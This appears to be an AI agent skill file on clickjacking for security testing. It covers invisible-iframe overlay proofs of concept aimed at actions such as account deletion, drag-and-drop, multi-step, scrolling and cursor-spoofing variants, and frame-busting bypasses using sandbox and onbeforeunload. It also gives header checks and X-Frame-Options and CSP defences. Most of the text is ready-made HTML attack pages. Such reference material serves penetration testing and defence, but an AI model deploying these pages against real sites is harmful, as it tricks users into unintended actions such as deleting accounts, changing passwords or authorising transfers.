---
name: clickjacking
description: Clickjacking and UI redressing attacks with frame busting bypass. Use when testing X-Frame-Options.
---

# Clickjacking

## Description
Clickjacking (UI Redressing) is a malicious technique where an attacker tricks a user into clicking on something different from what they perceive. This is typically achieved by overlaying transparent elements on top of legitimate web pages to capture user clicks.

## How It Works

1. Attacker creates a malicious page with a hidden iframe
2. The iframe loads the target website
3. User thinks they're clicking on the visible page
4. Actually clicking on hidden elements in the iframe
5. Results in unintended actions on the target site

## Basic Clickjacking PoC

### Invisible Iframe Overlay
```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 2;
        }
        .decoy {
            position: absolute;
            z-index: 1;
            top: 200px;
            left: 200px;
        }
    </style>
</head>
<body>
    <div class="decoy">
        <button>Click here to win a prize!</button>
    </div>
    <iframe src="https://target.com/delete-account"></iframe>
</body>
</html>
```

### Semi-Transparent (for testing)
```html
<style>
    iframe {
        position: absolute;
        width: 500px;
        height: 500px;
        opacity: 0.5;  /* Semi-transparent for testing */
        z-index: 2;
    }
</style>
<iframe src="https://target.com/sensitive-action"></iframe>
```

## Advanced Techniques

### 1. Drag and Drop Clickjacking
```html
<!DOCTYPE html>
<html>
<head>
    <style>
        #drag {
            width: 200px;
            height: 50px;
            background: blue;
            color: white;
            text-align: center;
            line-height: 50px;
            cursor: move;
        }
        #drop {
            width: 200px;
            height: 200px;
            border: 2px dashed gray;
            position: relative;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0;
        }
    </style>
</head>
<body>
    <div id="drag" draggable="true">Drag me!</div>
    <div id="drop">
        Drop here
        <iframe src="https://target.com/upload"></iframe>
    </div>
</body>
</html>
```

### 2. Multi-Step Clickjacking
```html
<!DOCTYPE html>
<html>
<head>
    <script>
        var step = 1;
        function nextStep() {
            if (step == 1) {
                document.getElementById('frame').src = 'https://target.com/step1';
                step++;
            } else if (step == 2) {
                document.getElementById('frame').src = 'https://target.com/step2';
                step++;
            } else {
                document.getElementById('frame').src = 'https://target.com/step3-confirm';
            }
        }
    </script>
    <style>
        iframe { opacity: 0; position: absolute; }
        button { position: absolute; z-index: 1; }
    </style>
</head>
<body>
    <button onclick="nextStep()">Continue</button>
    <iframe id="frame" src="https://target.com/step1"></iframe>
</body>
</html>
```

### 3. Scrolling Attack
```html
<style>
    #container {
        width: 100px;
        height: 100px;
        overflow: hidden;
        position: relative;
    }
    iframe {
        position: absolute;
        top: -300px;  /* Scroll to specific element */
        left: -200px;
        width: 1000px;
        height: 1000px;
        opacity: 0;
    }
</style>
<div id="container">
    <button>Click Here</button>
    <iframe src="https://target.com/settings"></iframe>
</div>
```

### 4. Cursor Manipulation
```html
<style>
    body {
        cursor: none;  /* Hide real cursor */
    }
    #fake-cursor {
        position: absolute;
        width: 20px;
        height: 20px;
        pointer-events: none;
        z-index: 1000;
    }
</style>
<script>
    document.addEventListener('mousemove', function(e) {
        var cursor = document.getElementById('fake-cursor');
        cursor.style.left = (e.clientX - 200) + 'px';  /* Offset */
        cursor.style.top = (e.clientY - 200) + 'px';
    });
</script>
<img id="fake-cursor" src="cursor.png">
<iframe src="https://target.com/action"></iframe>
```

## Bypass Techniques

### 1. Sandbox Attribute Bypass
```html
<!-- Allow forms and scripts but restrict other features -->
<iframe sandbox="allow-forms allow-scripts" src="https://target.com"></iframe>
```

### 2. Double Framing
```html
<!-- outer.html -->
<iframe src="middle.html"></iframe>

<!-- middle.html -->
<iframe src="https://target.com"></iframe>
```

### 3. OnBeforeUnload Bypass
```html
<script>
window.onbeforeunload = function() {
    return "Are you sure?";
};
</script>
<iframe src="https://target.com"></iframe>
```

### 4. X-Frame-Options Bypass via Browser Extensions
Some browser extensions may disable security headers.

### 5. Mobile-Specific Attacks
```html
<!-- Touch event hijacking -->
<style>
    iframe {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        opacity: 0;
        z-index: 2;
    }
</style>
<iframe src="https://target.com/mobile-action"></iframe>
```

## Detection Testing

### Manual Testing
```bash
# Check X-Frame-Options header
curl -I https://target.com | grep -i "x-frame-options"

# Check Content-Security-Policy
curl -I https://target.com | grep -i "content-security-policy"
```

### PoC Testing
1. Create HTML file with iframe pointing to target
2. Host on different domain
3. Check if target page loads in iframe
4. If it loads, site is vulnerable

### Automated Tools
- Burp Suite Clickbandit
- OWASP ZAP
- Custom scripts

## Common Vulnerable Scenarios

### 1. Account Actions
```
- Delete account button
- Change email/password
- Enable/disable 2FA
- Revoke sessions
```

### 2. Financial Actions
```
- Transfer money
- Change payment methods
- Authorize transactions
```

### 3. Social Actions
```
- Follow/unfollow users
- Like/share content
- Send messages
```

### 4. Permission Changes
```
- Grant OAuth permissions
- Allow camera/microphone
- Share location
```

## Protection Headers

### X-Frame-Options
```http
# Deny all framing
X-Frame-Options: DENY

# Allow same origin only
X-Frame-Options: SAMEORIGIN

# Allow specific origin (deprecated)
X-Frame-Options: ALLOW-FROM https://trusted.com
```

### Content-Security-Policy
```http
# Deny all framing
Content-Security-Policy: frame-ancestors 'none';

# Allow same origin
Content-Security-Policy: frame-ancestors 'self';

# Allow specific origins
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

## Frame Busting Scripts (Weak Protection)

### Common Frame Busters
```javascript
// Simple frame buster (bypassable)
if (top != self) {
    top.location = self.location;
}

// Better frame buster
if (top !== self) {
    top.location.href = self.location.href;
}
```

### Bypassing Frame Busters
```html
<!-- Using sandbox attribute -->
<iframe sandbox="allow-forms" src="https://target.com"></iframe>

<!-- Using onbeforeunload -->
<script>
window.onbeforeunload = function() { return false; };
</script>
<iframe src="https://target.com"></iframe>

<!-- IE: Security="restricted" -->
<iframe security="restricted" src="https://target.com"></iframe>
```

## Impact Assessment

| Scenario | Impact |
|----------|--------|
| Delete account | High |
| Change password | High |
| Transfer funds | Critical |
| Like/Follow | Low |
| Share content | Low-Medium |
| Grant permissions | High |

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking
- https://owasp.org/www-community/attacks/Clickjacking
- https://portswigger.net/web-security/clickjacking
